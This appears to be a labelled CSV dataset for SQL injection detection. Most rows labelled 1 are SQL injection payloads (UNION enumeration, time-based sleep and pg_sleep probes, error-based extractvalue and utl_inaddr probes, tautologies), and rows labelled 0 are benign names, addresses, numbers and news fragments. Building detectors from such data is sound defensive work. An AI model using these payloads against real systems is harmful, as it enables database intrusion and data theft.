Sentence,Label
 ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select  ( case when  ( 5877 = 5877 )  then char ( 49 )  else char ( 48 )  end  )  )  +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113  )  )  ,1
"1%"" )  union all select null,null,null,null,null,null,null--",1
5713340032825247,0
" Among others , airports Kopenhagen , Frankfurt Dubai already done away noisy call-outs ",0
2isp3n?3io43,0
8352,0
" These varieties lost sight little distance, little height thought",0
indocto,0
"1%' )  ( select  ( case when  ( 4587 = 4587 )  then regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null )  else char ( 76 ) ||char ( 65 ) ||char ( 102 ) ||char ( 72 )  end )  from  ( values ( 0  )  )   )  and  ( '%' = '",1
1796714227167241,0
"1' )  where 6731 = 6731 or elt ( 5873 = 5873,sleep ( 5  )  )  #",1
"-5652%' )  union all select 4447,4447,4447,4447,4447,4447,4447,4447,4447--",1
 something less official doctrine within White House ,0
48128,0
comparendo,0
romanones,0
garzon6@mtos.ro,0
1' )  as pghp where 9086 = 9086,1
romn,0
vogin,0
graff@manzanilladevillafafila.iq,0
1%'  )  )   or  ( select * from  ( select ( sleep ( 5  )  )   ) ydpu )  and   (  (  '%' = ',1
4599,0
08030,0
renette,0
joab,0
"1%' )  union all select null,null,null,null,null--",1
" The majority Americans - 158 million fact - celebrating Halloween year , spending total $ 6",0
"1%' )  union all select null,null,null--",1
10940,0
gruart ola,0
13593,0
broughton0@naturalchild.lc,0
fasti-dio,0
luego,0
ombra,0
 &quot; Evidence commission YMCA notified received second lowest four possible ratings Department Education Communities quality audit August year ,0
"-4736'  )  )   or elt ( 5835 = 5509,5509 )  and   (  (  'iawg' = 'iawg",1
fontihoyuelo,0
lightner.manor@rosaserigrafia.as,0
31410,0
 select sleep ( 5  )  )  ||',1
"-9583%""  )  )   union all select 9349,9349,9349,9349,9349,9349,9349--",1
"-5579%"" )  or 2724 in   (  (  char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select  ( case when  ( 2724 = 2724 )  then char ( 49 )  else char ( 48 )  end  )  )  +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113  )  )   )  and  ( ""%"" = """,1
10513,0
"1"" )  and 3732 = 3850 and  ( ""edjv"" = ""edjv",1
"1"" )  as cysq where 5258 = 5258",1
"1' )  or  ( select 2* ( if  (  (  select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 8113 = 8113,1  )  )   ) ,0x717a767a71,0x78  )  )  s ) , 8446744073709551610, 8446744073709551610  )  )   )  and  ( 'xgzb' = 'xgzb",1
"o casal 135, 4?a",0
1'  )  )   as yqcl where 5026 = 5026 rlike  ( select * from  ( select ( sleep ( 5  )  )   ) sgvo ) --,1
romaguera camargo,0
hi or a = a,1
"1  )  )   or 9643 =  ( select count ( * )  from domain.domains as t1,domain.columns as t2,domain.tables as t3 )  and   (  (  5888 = 5888",1
ad5ma.sc9r,0
"1'+ ( select bldn where 8321 = 8321 and 8635 =  ( select count ( * )  from generate_series ( 1,5000000  )  )  --",1
 A three-person commission set ensure state delivering services effectively efficiently possible ,0
"1  )  )   as xsyk where 2575 = 2575 or 8156 =  ( select count ( * )  from generate_series ( 1,5000000  )  )  --",1
" Mr Hare , started YMCA 21 , conceded management &quot; &quot; failed recruiting Lord failed make sure staff clear obligations report child safe policy breaches ",0
salvina,0
mathurin,0
moyers,0
admin' or 1 = 1/*,1
onofredo,0
mendiz espn,0
shafiq,0
perfeccin,0
lezo,0
cargaderos 79,0
"1%' )  and 3824 = benchmark ( 5000000,md5 ( 0x76555642  )  )   and  ( '%' = '",1
if ( 3831 = 9321 )  select 3831 else drop function ybru--,1
 Schmidt wish contact colleagues skirmish Hütter ,0
 UNION SELECT,1
1' where 3337 = 3337 and 8403 = 5760,1
"isla de nelson, 89 7?h",0
beaulieu,0
harris,0
78595518x,0
" Transportation secretaries , 2011 report urged Congress move pay-per-mile direction ",0
colrico,0
bailina quijad,0
desabor$ida,0
1  )  )   )  and 6467 = 1864#,1
enlutada,0
"masia can giro, 5",0
eugenio,0
" select * from users where id = 1 or "".#"" or 1 = 1 -- 1",1
" The meeting point one half hour tour Nuclear Bunder Museum , 3: 00 p",0
"1""  )  )   as rpxd where 4929 = 4929",1
aborr-ascarse,0
lithgow_porte@a2hotels.st,0
mclawhor,0
3654394570755468,0
amelita,0
850il1ta045n,0
23690,0
hemilce,0
descote,0
11,0
dudarova@automoviles-hibridos.ag,0
45440,0
" select * from users where id = '1' or  ( \. )  = 1 union select 1,@@VERSION -- 1'",1
"c/ en sala, 163",0
7315,0
"c/ alcaices, 23",0
"-5360' where 8178 = 8178 union all select 8178,8178,8178--",1
"-4592""  )  )   or 4493 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 4493 = 4493 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   and   (  (  ""xvpz"" = ""xvpz",1
homan,0
pi,0
"luis braille, 193 6?a",0
" Shares Bombardier , also announced Google Inc Chief Financial Officer Patrick Pichette would join board , 8",0
"1' and elt ( 4249 = 4249,7259 )  and 'nsbj' like 'nsbj",1
hurcal-overa,0
"-4637' union all select 9361,9361,9361,9361,9361,9361,9361,9361#",1
46344401e,0
"1' and 3824 = benchmark ( 5000000,md5 ( 0x76555642  )  )   and 'pbin' = 'pbin",1
varley@tecnoindomo.ki,0
" Up , hungry sunshine winter travel nearby peak cable car ",0
8otijo,0
1364,0
franchetti.martinsan@elsentidodelavida.qa,0
 Terminal 3 serves mainly small US airlines ,0
" As airport spokesperson Peter Kleeman announced Radio Vienna adjusting approach towards announcements , Vienna Airport following international trend ",0
chua@comerciosdeaspe.om,0
messenger@blanquillos.pk,0
"select * from generate_series ( 7667,7667,case when  ( 7667 = 8232 )  then 1 else 0 end )  limit 1--",1
1' )  where 9159 = 9159,1
"plaa lloreda, 155",0
09530,0
"1  )  )   )  and 6510 =  ( select count ( * )  from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 )  and   (  (   ( 4234 = 4234",1
"1""  )  )   procedure analyse ( extractvalue ( 5840,concat ( 0x5c,0x7171706a71, ( select  ( case when  ( 5840 = 5840 )  then 1 else 0 end  )  )  ,0x717a767a71  )  )  ,1 )  and   (  (  ""rtyu"" like ""rtyu",1
"1' where 4417 = 4417 and 6537 = dbms_pipe.receive_message ( chr ( 76 ) ||chr ( 116 ) ||chr ( 117 ) ||chr ( 65 ) ,5 ) --",1
kuneva_germaine@ajuntamentdebcn2-0.cy,0
01084400l,0
select case when 6558 = 4327 then 1 else null end--,1
"rio nervion, 177",0
"1'  )  )   and 8407 =  ( select count ( * )  from generate_series ( 1,5000000  )  )   and   (  (  'lwyo' = 'lwyo",1
nixon@chinavende.bw,0
"1"" and 6510 =  ( select count ( * )  from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 )  and ""hcjz"" like ""hcjz",1
c/ los castaos 10,0
2i6os2,0
raphael,0
" If one wanted strong European IT industry , one &apos;t let die 20 years ago ",0
"-9954""  )  )   or 4144 =  ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 4144 = 4144 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62  )  )   )  from dual )  and   (  (  ""bifi"" = ""bifi",1
2796348455963884,0
plommer8@artesania.org.sj,0
"1 and row ( 6237,7469 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select  ( elt ( 6237 = 6237,1  )  )   ) ,0x717a767a71,floor ( rand ( 0 ) *2  )  )  x from  ( select 5192 union select 3785 union select 3931 union select 7158 ) a group by x ) # aetd",1
"roda de andaluca, la",0
" , whether required enroll Obamacare ",0
-2165' where 6593 = 6593 or 9158 = 7254--,1
bertie,0
terrs triola,0
bazet aguil,0
98097212g,0
2049,0
roe,0
0076747388160328,0
juifen5,0
10328,0
"c/ bascuana 52, 5-e",0
"1"" )  as uuth where 8555 = 8555 union all select null,null#",1
ae57f5r4,0
1  )  )   )  order by 1#,1
6341905837989254,0
69299598t,0
"torms, els",0
55842507w,0
"comandante barja 84,",0
"1  )  )   as uizx where 2512 = 2512 and make_set ( 1402 = 2908,2908 ) --",1
 A rapid progression may warrant tests endocrinologist rule serious problems tumors cysts ,0
calle matias ramon martinez martinez 30,0
"calle perez galdos, 167",0
"c/ fray diego de cadiz, 50",0
 A fantastic writer ,0
eglevsky-dux@tacticlinks.ch,0
"1"" )  where 1793 = 1793",1
"1%""  )  )   )  and  ( 3020 = 3020 ) *6703 and   (  (   ( ""%"" = """,1
-5615' )  where 5931 = 5931 or 8450 = 9229,1
galt@automovilesalhambra.kr,0
espaldilla,0
sayer@esbien.bi,0
"1"" )  and 2853 = cast  (  (  chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113  )  )  || ( select  ( case when  ( 2853 = 2853 )  then 1 else 0 end  )  )  ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   as numeric )  and  ( ""zyeo"" like ""zyeo",1
47106635j,0
"avenida mendez alvaro, 178,",0
dev,0
1  )  )   and  ( select * from  ( select ( sleep ( 5  )  )   ) gcrr ) #,1
nagy4,0
massanes,0
" select * from users where id = 1.<@$ union select 1,version (  )  -- 1",1
32621,0
1  )  )   as vryv where 5600 = 5600,1
p0cagallina,0
28850,0
sebastian_ferdi@tintaultravioleta.mv,0
elliot,0
ketley,0
1'+ ( select 'wpnm' where 8223 = 8223 and 6240 =  ( 'qqpjq'|| ( select case 6240 when 6240 then 1 else 0 end from rdb$database ) ||'qzvzq'  )  )  +',1
nery,0
"guadalquivir 116,",0
canal dolcet,0
"1"" )  as frmp where 6073 = 6073",1
0212404020033772,0
nayme,0
 He identified personal motivation work area auditing young member parliament ,0
"avinguda carrilet, 21,",0
53,0
laguna de cameros,0
t0aspa70ble,0
6ab48t1r,0
"c/ juan luis peralta, 49 13-f",0
19552581m,0
" She vagina , uterus ovaries ",0
"calle limones, 60,",0
"1'  ( select  ( case when  ( 5451 = 5451 )  then regexp_substring ( repeat ( right ( char ( 5451 ) ,0 ) ,500000000 ) ,null )  else char ( 108 ) ||char ( 76 ) ||char ( 112 ) ||char ( 116 )  end )  from information_schema.system_users )  and 'hqqj' = 'hqqj",1
tape,0
es9a5raga7o,0
"1' or exp ( ~ ( select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 6270 = 6270,1  )  )   ) ,0x717a767a71,0x78  )  )  x  )  )   and 'zenl' like 'zenl",1
" (2005) integrate prosodic features (pitch, pause duration, etc",0
"select dbms_pipe.receive_message ( chr ( 66 ) ||chr ( 67 ) ||chr ( 79 ) ||chr ( 101 ) ,5 )  from dual and '%' = '",1
" Deep cracks number individual stones testify weather damage , however , present wall danger collapse ",0
chungjen,0
-7452 where 2224 = 2224 or 4747 = dbms_utility.sqlid_to_sqlhash  (  (  chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 4747 = 4747 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   ) --,1
 Tony Abbott &apos;s daughters Frances Bridget ,0
-5880'  )  )   or 2724 in   (  (  char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select  ( case when  ( 2724 = 2724 )  then char ( 49 )  else char ( 48 )  end  )  )  +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113  )  )   )  and   (  (  'rwgl' = 'rwgl,1
guils de cerdanya,0
"1"" or 4411 =  ( select count ( * )  from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 )  and ""snht"" = ""snht",1
larreynaga arce,0
thomas.aranda@muchochinoenchina.iq,0
addons,0
"1 where 5401 = 5401 and elt ( 1210 = 1210,sleep ( 5  )  )  --",1
6053,0
bosch linares,0
"-4558"" or  ( 3965 = 3933 ) *3933 and ""hmdb"" like ""hmdb",1
castrono,0
clay9@showcars.cz,0
1' )  where 3767 = 3767 and 6240 =  ( 'qqpjq'|| ( select case 6240 when 6240 then 1 else 0 end from rdb$database ) ||'qzvzq' ) --,1
"1%' )  or 7417 =  ( select count ( * )  from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",1
3578,0
15984899z,0
"1"" where 9230 = 9230",1
" Not yet school months taking first steps , toddler pet Shetland pony Toffee trotted three rounds ease take top prize - leaving 30 adult opponents trailing behind ",0
logan,0
noem,0
arnold,0
"1'  )  )   and 6510 =  ( select count ( * )  from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 )  and   (  (  'vcvj' = 'vcvj",1
escribano peraldo,0
87,0
"c/ angel ochotorena, 132, 10?b",0
"select * from generate_series ( 3180,3180,case when  ( 3180 = 4445 )  then 1 else 0 end )  limit 1--",1
"-1598  )  )   )  union all select 9418,9418,9418,9418,9418,9418,9418#",1
 end# ckxq,1
nolen@enmenorca.com.th,0
"1'  )  )   and 3824 = benchmark ( 5000000,md5 ( 0x76555642  )  )   and   (  (  'bemh' = 'bemh",1
" end and   (  (   ( ""memh"" like ""memh",1
 A complex planning approval procedure must completed ,0
a3ui11d,0
"1"" and 1668 = 8288",1
bar7ech7r5,0
 My life spectacle,0
"1"" )  as giqb where 4664 = 4664",1
"1 where 6077 = 6077 or char ( 119 ) ||char ( 100 ) ||char ( 99 ) ||char ( 121 )  = regexp_substring ( repeat ( right ( char ( 1441 ) ,0 ) ,5000000000 ) ,null ) --",1
"1""  )  )   as dpln where 4193 = 4193 rlike sleep ( 5 ) --",1
01139,0
"1'+ ( select syrz where 7699 = 7699 union all select null,null,null#",1
1' )  as epgz where 2898 = 2898 and 7028 = 2287#,1
"-5130'  )  )   union all select 5218,5218,5218,5218,5218,5218,5218,5218,5218,5218--",1
-2625'  )  )   or 3038 = 3038,1
"1""  )  )   and 8148 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2  )  )    )  )  --",1
8912,0
"waitfor delay '0:0:5' and ""cvqn"" like ""cvqn",1
kitaen5@lawn.vn,0
"1""  )  )   )  rlike sleep ( 5 ) #",1
"1 and 8514 =  ( select count ( * )  from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) -- loao",1
9e3ed330a,0
"calle santa corda, 84, 3?h",0
"1"" )  and updatexml ( 3393,concat ( 0x2e,0x7171706a71, ( select  ( elt ( 3393 = 3393,1  )  )   ) ,0x717a767a71 ) ,1161 )  and  ( ""nkgd"" = ""nkgd",1
burgos,0
75022145d,0
"waitfor delay '0:0:5' and   (  (   ( ""lpeo"" = ""lpeo",1
brittni,0
las gijn,0
piqueras,0
16610,0
fonoll zurko,0
1 or sleep ( 5 ) ,1
justiniano,0
tobias5,0
"1""  )  )   as turj where 1237 = 1237",1
"1 where 8389 = 8389 union all select null,null,null,null,null,null,null,null,null,null#",1
-3462'  )  )   or 4493 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 4493 = 4493 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   and   (  (  'cxku' like 'cxku,1
"1'  )  )   or 6979 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2  )  )    )  )  --",1
maurice@salacomplices.ua,0
 ( select 2527 from pg_sleep ( 5  )  )  ,1
kirkley9,0
"1', ( select  ( case when  ( 3576 = 7744 )  then 1 else cast ( 1 as int ) / ( select 0 from dual )  end )  from dual ) ",1
tapinga,0
"-9237' )  union all select 7454,7454,7454,7454,7454,7454,7454,7454,7454--",1
" &quot; A job like something achieve overnight , &quot; said Gerster praise annual financial statement ",0
1'|| ( select 'glec' from dual where 4846 = 4846,1
"1""  )  )   and sleep ( 5 )  and   (  (  ""timv"" = ""timv",1
hablistn,0
rayadillo,0
4la3ue95,0
santa cristina de valmadrigal,0
"-3758'  )  )   union all select 9460,9460,9460,9460,9460,9460,9460,9460--",1
4233835783562631,0
rupp@djbroadcast.gov,0
yvone,0
"chato de la isla, 50 10-g",0
1 )  or sleep ( 5 ) #,1
1'  )  )   )  and 2853 = cast  (  (  chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113  )  )  || ( select  ( case when  ( 2853 = 2853 )  then 1 else 0 end  )  )  ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   as numeric )  and   (  (   ( 'gegg' = 'gegg,1
15lo956i1o,0
"-9356 or elt ( 1032 = 1032,3623 ) -- izgi",1
59072549q,0
laga_rtijo,0
1  )  )   )  and 2006 = 2006,1
 A short-circuit reported occurred sawing ,0
escobedo santagata,0
 select * from information_schema.tables--,1
" select * from users where id = '1' + $+*$ union select 1,@@VERSION -- 1'",1
1769471856078209,0
acampo,0
9307824408281680,0
"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( table_name )  FROM  ( SELECT DISTINCT ( table_name ) , ROWNUM AS LIMIT FROM sys.all_tables )  WHERE LIMIT = 1  )  )   AND 'i' = 'i",1
"-4802 union all select 7381,7381,7381,7381,7381,7381,7381,7381,7381,7381--",1
" chemical weapons program items contained moved declared sites , inspected ",0
3163610251088637,0
1 )  and 2853 = cast  (  (  chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113  )  )  || ( select  ( case when  ( 2853 = 2853 )  then 1 else 0 end  )  )  ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   as numeric )  and  ( 9932 = 9932,1
-9650' )  or 1390 = 3209,1
genoveva,0
 Frontier spokeswoman Kate O &apos;Malley said $ 100 fee get travelers take care charge advance ,0
"1'  )  )   or 8421 =  ( select count ( * )  from generate_series ( 1,5000000  )  )   and   (  (  'lqpd' = 'lqpd",1
"1 or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 ) # tsxs",1
"1%' )  and  ( select 9067 from ( select count ( * ) ,concat ( 0x7171706a71, ( select  ( elt ( 9067 = 9067,1  )  )   ) ,0x717a767a71,floor ( rand ( 0 ) *2  )  )  x from information_schema.character_sets group by x ) a )  and  ( '%' = '",1
campillo de llerena,0
"pl. cantarranillas 21,",0
 ( select  ( case when  ( 9525 = 9280 )  then 9525 else 9525* ( select 9525 from master..sysdatabases )  end  )  )  ,1
nicole-meyer@creacionesdolcevita.us,0
d9s1a1i89,0
atufamiento,0
chan+quete,0
7441005651932884,0
1'  )  )   and sleep ( 5 )  and   (  (  'jiio' like 'jiio,1
50549,0
1'|| ( select 'ldad' where 6146 = 6146 rlike  ( select  ( case when  ( 7689 = 7689 )  then 1 else 0x28 end  )  )   ) ||',1
1' )  or 4240 =  ( select 4240 from pg_sleep ( 5  )  )  --,1
"1%"" union all select null,null--",1
" A dough becomes fluffy replacing egg mixture one tablespoon baking powder , one tablespoon cornflour three tablespoons mineral water , example ",0
"1"" or char ( 117 ) ||char ( 111 ) ||char ( 105 ) ||char ( 100 )  = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null )  and ""zyoo"" = ""zyoo",1
"-8060"" )  where 5290 = 5290 or 5903 =  ( 'qqpjq'|| ( select case 5903 when 5903 then 1 else 0 end from rdb$database ) ||'qzvzq' ) --",1
auleda sez,0
pi9h329a,0
"c/ bailen 8,",0
" On saying, What I sacredness traditions, I live wholly within? friend suggested, — “But impulses may below, above",0
"1'+ ( select 'mikf' where 5814 = 5814 or 5356 =  ( select count ( * )  from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",1
37209,0
"1""  )  )   union all select null,null,null,null,null,null,null,null#",1
"1 where 2267 = 2267 and 6537 = dbms_pipe.receive_message ( chr ( 76 ) ||chr ( 116 ) ||chr ( 117 ) ||chr ( 65 ) ,5 ) --",1
08806627l,0
02340,0
22232,0
abogada,0
' or 1 = 1 --,1
"-3179'+ ( select 'tzzz' where 3191 = 3191 union all select 3191,3191,3191,3191,3191#",1
1%' )  and 7756 = dbms_utility.sqlid_to_sqlhash  (  (  chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 7756 = 7756 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   )  and  ( '%' = ',1
